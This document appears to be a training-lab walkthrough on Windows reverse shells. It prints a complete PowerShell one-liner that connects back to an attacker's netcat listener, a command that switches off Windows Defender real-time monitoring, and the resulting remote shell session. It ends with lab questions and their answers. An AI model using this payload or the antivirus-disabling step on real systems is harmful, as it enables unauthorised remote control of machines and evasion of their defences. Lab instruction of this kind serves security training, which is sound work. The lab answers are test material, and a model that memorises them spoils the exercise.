# Reverse Shells
With this walkthrough, we will be establishing a simple reverse shell using some PowerShell code on a Windows target. 

**Server (attack box)**
```
$ sudo nc -lvnp 443
Listening on 0.0.0.0 443
```
**Client (target)**
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<server_ip>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
```
At line:1 char:1
+ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443) ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```
The Windows Defender antivirus (AV) software stopped the execution of the code. For our purposes, we will want to disable the antivirus through the Virus & threat protection settings or by using this command in an administrative PowerShell console (right-click, run as admin):
```
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```
**Server (attack box)**
```
$ sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.36.68 49674

PS C:\Users\htb-student> whoami
ws01\htb-student
```

## Questions
1. When establishing a reverse shell session with a target, will the target act as a client or server? **Answer: client**
2. Connect to the target via RDP and establish a reverse shell session with your attack box then submit the hostname of the target box. **Answer: Shells-Win10**